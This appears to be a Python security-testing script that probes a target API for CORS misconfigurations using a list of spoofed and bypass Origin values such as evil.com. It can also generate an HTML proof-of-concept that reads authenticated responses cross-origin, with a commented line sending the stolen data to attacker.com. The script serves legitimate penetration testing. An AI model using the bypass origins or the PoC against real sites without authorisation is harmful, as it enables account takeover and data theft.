#!/usr/bin/env python3
"""
Reference example: CORS Misconfiguration Testing

This file is a reference implementation illustrating how to test for
CORS misconfigurations that could allow cross-origin attacks.
Adapt to your specific target application.

CLI Alternative to: Corsy

Usage:
    python cors_testing.py --url "http://target.com/api/user" --output results.json
    python cors_testing.py --url "http://target.com/api/user" --cookie "session=abc123"
"""
import argparse
import json
import hashlib
import requests
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse
import re

# Disable SSL warnings for testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Response size limit
MAX_RESPONSE_SIZE = 8 * 1024

# CORS test origins - {target} will be replaced with target domain
CORS_ORIGINS = [
    # Null origin (sandbox bypass)
    "null",

    # Reflection test
    "https://evil.com",
    "http://evil.com",

    # Subdomain variations
    "https://evil.{target}",
    "https://{target}.evil.com",
    "https://subdomain.{target}",

    # Suffix bypass (weak regex)
    "https://{target}evil.com",
    "https://evil{target}.com",

    # Prefix bypass
    "https://evil-{target}",

    # Special character bypass
    "https://{target}@evil.com",
    "https://evil.com%00{target}",
    "https://evil.com#{target}",
    "https://evil.com?.{target}",

    # Protocol downgrade
    "http://{target}",

    # Localhost bypass
    "http://localhost",
    "http://127.0.0.1",
]


def truncate_and_hash(response_text: str) -> tuple:
    """Truncate response and compute hash"""
    full_hash = hashlib.sha256(response_text.encode()).hexdigest()
    truncated = response_text[:MAX_RESPONSE_SIZE]
    is_truncated = len(response_text) > MAX_RESPONSE_SIZE

    return truncated, f"sha256:{full_hash}", is_truncated, len(response_text)


def extract_cors_headers(response: requests.Response) -> Dict[str, str]:
    """Extract CORS-related headers from response"""
    cors_headers = {}
    cors_header_names = [
        "Access-Control-Allow-Origin",
        "Access-Control-Allow-Credentials",
        "Access-Control-Allow-Methods",
        "Access-Control-Allow-Headers",
        "Access-Control-Expose-Headers",
        "Access-Control-Max-Age",
    ]

    for header in cors_header_names:
        if header.lower() in [h.lower() for h in response.headers]:
            # Case-insensitive header lookup
            for h, v in response.headers.items():
                if h.lower() == header.lower():
                    cors_headers[header] = v
                    break

    return cors_headers


def analyze_cors_vulnerability(
    origin: str,
    cors_headers: Dict[str, str],
    target_domain: str
) -> Dict[str, Any]:
    """Analyze CORS headers for vulnerabilities"""
    acao = cors_headers.get("Access-Control-Allow-Origin", "")
    acac = cors_headers.get("Access-Control-Allow-Credentials", "").lower()

    vulnerability = None
    severity = None
    details = ""

    # Check for origin reflection
    if acao == origin:
        if acac == "true":
            vulnerability = "CORS_ORIGIN_REFLECTION_WITH_CREDENTIALS"
            severity = "HIGH"
            details = f"Origin '{origin}' is reflected with credentials allowed - full account takeover possible"
        else:
            vulnerability = "CORS_ORIGIN_REFLECTION"
            severity = "MEDIUM"
            details = f"Origin '{origin}' is reflected - cross-origin data access possible"

    # Check for null origin
    elif origin == "null" and acao == "null":
        if acac == "true":
            vulnerability = "CORS_NULL_ORIGIN_WITH_CREDENTIALS"
            severity = "HIGH"
            details = "Null origin allowed with credentials - sandbox/data URI bypass possible"
        else:
            vulnerability = "CORS_NULL_ORIGIN"
            severity = "MEDIUM"
            details = "Null origin allowed - limited cross-origin access"

    # Check for wildcard with credentials (invalid but sometimes misconfigured)
    elif acao == "*":
        if acac == "true":
            vulnerability = "CORS_WILDCARD_WITH_CREDENTIALS"
            severity = "HIGH"
            details = "Wildcard origin with credentials (invalid config) - universal access"
        else:
            vulnerability = "CORS_WILDCARD"
            severity = "LOW"
            details = "Wildcard origin allowed - public resource exposure"

    # Check if target domain appears in allowed origin (subdomain takeover risk)
    elif target_domain in acao and origin != f"https://{target_domain}":
        vulnerability = "CORS_SUBDOMAIN_TRUST"
        severity = "MEDIUM"
        details = f"Trusts subdomains - subdomain takeover could lead to CORS bypass"

    return {
        "vulnerability": vulnerability,
        "severity": severity,
        "details": details,
        "is_vulnerable": vulnerability is not None
    }


def test_cors_origin(
    url: str,
    origin: str,
    session: requests.Session,
    timeout: int = 10
) -> Dict[str, Any]:
    """Test a single CORS origin"""
    headers = {"Origin": origin}

    try:
        resp = session.get(url, headers=headers, timeout=timeout,
                         verify=False, allow_redirects=False)

        cors_headers = extract_cors_headers(resp)
        snippet, resp_hash, truncated, orig_size = truncate_and_hash(resp.text)

        # Parse target domain
        parsed = urlparse(url)
        target_domain = parsed.netloc

        analysis = analyze_cors_vulnerability(origin, cors_headers, target_domain)

        return {
            "origin_tested": origin,
            "url": url,
            "status_code": resp.status_code,
            "cors_headers": cors_headers,
            "response_snippet": snippet[:200],
            "response_hash": resp_hash,
            "truncated": truncated,
            "original_size_bytes": orig_size,
            **analysis
        }

    except requests.RequestException as e:
        return {
            "origin_tested": origin,
            "url": url,
            "error": str(e),
            "is_vulnerable": False
        }


def test_cors(
    url: str,
    cookie: Optional[str] = None,
    header: Optional[str] = None,
    timeout: int = 10
) -> Dict[str, Any]:
    """
    Main CORS testing function

    Args:
        url: Target URL to test
        cookie: Optional session cookie
        header: Optional custom header
        timeout: Request timeout

    Returns:
        Dictionary with all CORS test results
    """
    session = requests.Session()

    # Set cookies if provided
    if cookie:
        for c in cookie.split(";"):
            c = c.strip()
            if "=" in c:
                name, value = c.split("=", 1)
                session.cookies.set(name.strip(), value.strip())

    # Set custom headers if provided
    if header:
        if ":" in header:
            name, value = header.split(":", 1)
            session.headers[name.strip()] = value.strip()

    # Extract target domain for payload generation
    parsed = urlparse(url)
    target_domain = parsed.netloc

    # Get baseline response (no Origin header)
    try:
        baseline_resp = session.get(url, timeout=timeout, verify=False)
        baseline_cors = extract_cors_headers(baseline_resp)
        baseline_snippet, baseline_hash, baseline_truncated, baseline_size = truncate_and_hash(baseline_resp.text)

        baseline = {
            "url": url,
            "status_code": baseline_resp.status_code,
            "cors_headers": baseline_cors,
            "response_snippet": baseline_snippet[:200],
            "response_hash": baseline_hash,
            "truncated": baseline_truncated,
            "original_size_bytes": baseline_size
        }
    except requests.RequestException as e:
        return {
            "status": "UNVALIDATED",
            "reason": f"Baseline request failed: {str(e)}",
            "baseline": None,
            "tests": []
        }

    # Test all CORS origins
    tests = []
    for origin_template in CORS_ORIGINS:
        origin = origin_template.replace("{target}", target_domain)
        result = test_cors_origin(url, origin, session, timeout)
        tests.append(result)

    # Find vulnerabilities
    vulnerabilities = [t for t in tests if t.get("is_vulnerable")]

    # Determine overall status
    if vulnerabilities:
        high_sev = [v for v in vulnerabilities if v.get("severity") == "HIGH"]
        if high_sev:
            status = "VALIDATED"
            evidence = f"CRITICAL: Found {len(high_sev)} high-severity CORS misconfigurations"
        else:
            status = "VALIDATED"
            evidence = f"Found {len(vulnerabilities)} CORS misconfigurations"
    else:
        status = "FALSE_POSITIVE"
        evidence = "No CORS misconfigurations found"

    return {
        "status": status,
        "baseline": baseline,
        "tests": tests,
        "vulnerabilities": vulnerabilities,
        "evidence": evidence
    }


def generate_poc(vulnerability: Dict[str, Any], target_url: str) -> str:
    """Generate PoC HTML for CORS exploitation"""
    origin = vulnerability.get("origin_tested", "")

    poc = f'''<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC</title>
</head>
<body>
    <h1>CORS Exploitation PoC</h1>
    <p>Target: {target_url}</p>
    <p>Origin: {origin}</p>
    <div id="result"></div>

    <script>
    var req = new XMLHttpRequest();
    req.onload = function() {{
        document.getElementById('result').innerHTML =
            '<pre>' + this.responseText + '</pre>';
        // Exfiltrate to attacker server:
        // fetch('https://attacker.com/log?data=' + encodeURIComponent(this.responseText));
    }};
    req.open('GET', '{target_url}', true);
    req.withCredentials = true;
    req.send();
    </script>
</body>
</html>'''

    return poc


def main():
    parser = argparse.ArgumentParser(description="CORS Misconfiguration Testing Script")
    parser.add_argument("--url", required=True, help="Target URL to test")
    parser.add_argument("--cookie", help="Session cookie (name=value; name2=value2)")
    parser.add_argument("--header", "-H", help="Custom header (Header-Name: value)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (seconds)")
    parser.add_argument("--output", "-o", required=True, help="Output JSON file")
    parser.add_argument("--poc", action="store_true", help="Generate PoC HTML for vulnerabilities")

    args = parser.parse_args()

    print(f"[*] Testing CORS on: {args.url}")

    result = test_cors(
        url=args.url,
        cookie=args.cookie,
        header=args.header,
        timeout=args.timeout
    )

    # Generate PoCs if requested
    if args.poc and result.get("vulnerabilities"):
        result["pocs"] = []
        for vuln in result["vulnerabilities"]:
            poc = generate_poc(vuln, args.url)
            result["pocs"].append({
                "vulnerability": vuln.get("vulnerability"),
                "origin": vuln.get("origin_tested"),
                "html": poc
            })

    with open(args.output, 'w') as f:
        json.dump(result, f, indent=2)

    print(f"[*] Status: {result['status']}")
    print(f"[*] Evidence: {result.get('evidence', 'N/A')}")

    if result.get('vulnerabilities'):
        print(f"[!] Found {len(result['vulnerabilities'])} CORS vulnerability(ies):")
        for vuln in result['vulnerabilities']:
            print(f"    - [{vuln.get('severity')}] {vuln.get('vulnerability')}")
            print(f"      Origin: {vuln.get('origin_tested')}")
            print(f"      Details: {vuln.get('details')}")

    print(f"[*] Results saved to: {args.output}")

    return 0 if result['status'] != 'UNVALIDATED' else 1


if __name__ == "__main__":
    exit(main())
